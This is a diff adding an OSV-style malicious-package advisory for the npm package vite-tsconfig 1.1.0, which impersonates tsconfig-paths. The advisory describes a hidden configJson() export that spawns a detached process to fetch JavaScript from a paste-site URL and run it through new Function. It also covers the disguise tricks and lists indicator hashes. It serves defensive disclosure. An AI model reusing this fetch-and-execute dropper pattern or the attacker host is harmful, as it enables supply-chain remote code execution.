@@ -1,0 +1,80 @@
+{
+  "modified": "2026-06-11T05:21:54Z",
+  "published": "2026-06-11T05:21:54Z",
+  "schema_version": "1.7.4",
+  "id": "MAL-2026-5576",
+  "summary": "Malicious code in vite-tsconfig (npm)",
+  "details": "\n---\n_-= Per source details. Do not edit below this line.=-_\n\n## Source: amazon-inspector (142b4a600291ebf355bb7915c082c34b329e58026dc3c1f181a5b1865c16cff9)\nThe package is named vite-tsconfig and replicates the public API of the legitimate tsconfig-paths library (register, loadConfig, createMatchPath, matchFromAbsolutePaths), but adds an extra exported function `configJson` that is not present upstream. When a consumer calls `configJson()`, lib/config-loader.js spawns a detached, stdio-suppressed `node lib/mapProps.js` child process (child_process.spawn with detached:true and child.unref()). lib/mapProps.js then issues `axios.get('https://www.jsonkeeper.com/b/5IZTJ')` with header `x-secret-key: _`, takes `response.data.Cookie`, and executes it as JavaScript with full Node capability via `new Function('require', s)(require)` — retried up to 5 times. jsonkeeper.com is an anonymous public JSON paste host, so the executed payload is mutable and attacker-controlled, giving the publisher arbitrary remote code execution on any machine where a consumer invokes the documented `configJson` API. The remote URL is camouflaged as `DEV_API_KEY` inside a fake `process.env` shadow object, and the loader is wrapped in pino-logger-shaped config (messageKey/levels in lib/config-loader.js) to disguise the dropper. README references `vite-json` and `dividab/tsconfig-paths`, confirming the impersonation framing.\n",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "vite-tsconfig"
+      },
+      "versions": [
+        "1.1.0"
+      ],
+      "database_specific": {
+        "cwes": [
+          {
+            "cweId": "CWE-506",
+            "description": "The product contains code that appears to be malicious in nature.",
+            "name": "Embedded Malicious Code"
+          }
+        ],
+        "indicators": {
+          "evidence_files": [
+            {
+              "path": "lib/mapProps.js",
+              "sha256": "c3c20201b376f76b2f4c08ed64da39f703448f318f584f358007591ad3f9bcd0",
+              "tlsh": "1c21124f757ca0a8017013f5a72be426f965643f300290d5739cc7a21f3655da182fde"
+            },
+            {
+              "path": "lib/config-loader.js",
+              "sha256": "94c1ab6d8ceb818c37f7cd023dcbf42d4e0513874b9ec3306f1f3b7ad9625c81",
+              "tlsh": "5d81435b6ad4a9e600b19b64d62bd016ff702f77230680a2793cd1d41f39844a1e6efa"
+            }
+          ],
+          "package_integrity": [
+            {
+              "filename": "vite-tsconfig-1.1.0.tgz",
+              "hashes": {
+                "sha1": "d47d8cc3c868762e31da685a407b3f3d3c94b2e8",
+                "sha512_sri": "sha512-9KV5foA7sax35F5hcVBu8eAb5f1c+79CzQrV81Kktx7wrTF5Z7rOynTfHZf0T0Cb9qi9ghA9mr9AZwSLmNljWA=="
+              }
+            }
+          ]
+        }
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/vite-tsconfig/v/1.1.0"
+    }
+  ],
+  "credits": [
+    {
+      "name": "Amazon Inspector",
+      "type": "FINDER",
+      "contact": [
+        "inspector-research@amazon.com"
+      ]
+    }
+  ],
+  "database_specific": {
+    "malicious-packages-origins": [
+      {
+        "id": "IN-MAL-2026-005599",
+        "import_time": "2026-06-11T05:41:11.175888394Z",
+        "modified_time": "2026-06-11T05:21:54Z",
+        "sha256": "142b4a600291ebf355bb7915c082c34b329e58026dc3c1f181a5b1865c16cff9",
+        "source": "amazon-inspector",
+        "versions": [
+          "1.1.0"
+        ]
+      }
+    ]
+  }
+}
